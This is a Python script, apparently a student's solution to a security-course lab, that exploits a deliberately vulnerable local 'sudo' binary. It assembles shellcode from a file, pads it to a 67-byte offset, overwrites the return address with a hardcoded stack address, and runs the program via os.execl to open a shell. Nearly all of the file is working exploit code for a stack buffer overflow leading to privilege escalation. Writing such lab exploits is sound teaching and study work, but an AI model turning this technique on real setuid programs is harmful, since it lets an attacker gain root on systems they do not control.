import os
import sys
from infosec.core import assemble


def run_shell(path_to_sudo: str):
    """
    Exploit the vulnerable sudo program to open an interactive shell.

    The assembly code of the shellcode should be saved in `shellcode.asm`, use
    the `assemble` module to translate the assembly to bytes.

    WARNINGS:
    1. As before, use `path_to_sudo` and don't hard-code the path.
    2. If you reference any external file, it must be *relative* to the current
       directory! For example './shellcode.asm' is OK, but
       '/home/user/3/q2/shellcode.asm' is bad because it's an absolute path!

    Tips:
    1. For help with the `assemble` module, run the following command (in the
       command line).
           ipython3 -c 'from infosec.core import assemble; help(assemble)'
    2. As before, prefer using `os.execl` over `os.system`.

    :param path_to_sudo: The path to the vulnerable sudo program.
    """
    
    OFFSET_TO_RETURN_ADDRESS = 67 # value Y
    BUFFER_ADDRESS = 0xbfffdfd9   # value X

    shellcode = assemble.assemble_file("./shellcode.asm")

    if len(shellcode) > OFFSET_TO_RETURN_ADDRESS:
        raise ValueError("Shellcode is too long")

    padding = b"A" * (OFFSET_TO_RETURN_ADDRESS - len(shellcode))
    return_address = BUFFER_ADDRESS.to_bytes(4, "little")
    payload = shellcode + padding + return_address
    os.execl(
        path_to_sudo,
        path_to_sudo,
        payload,
        b"/bin/sh",)
  

def main(argv):
    # WARNING: Avoid changing this function.
    if not len(argv) == 1:
        print('Usage: %s' % argv[0])
        sys.exit(1)

    run_shell(path_to_sudo='./sudo')


if __name__ == '__main__':
    main(sys.argv)
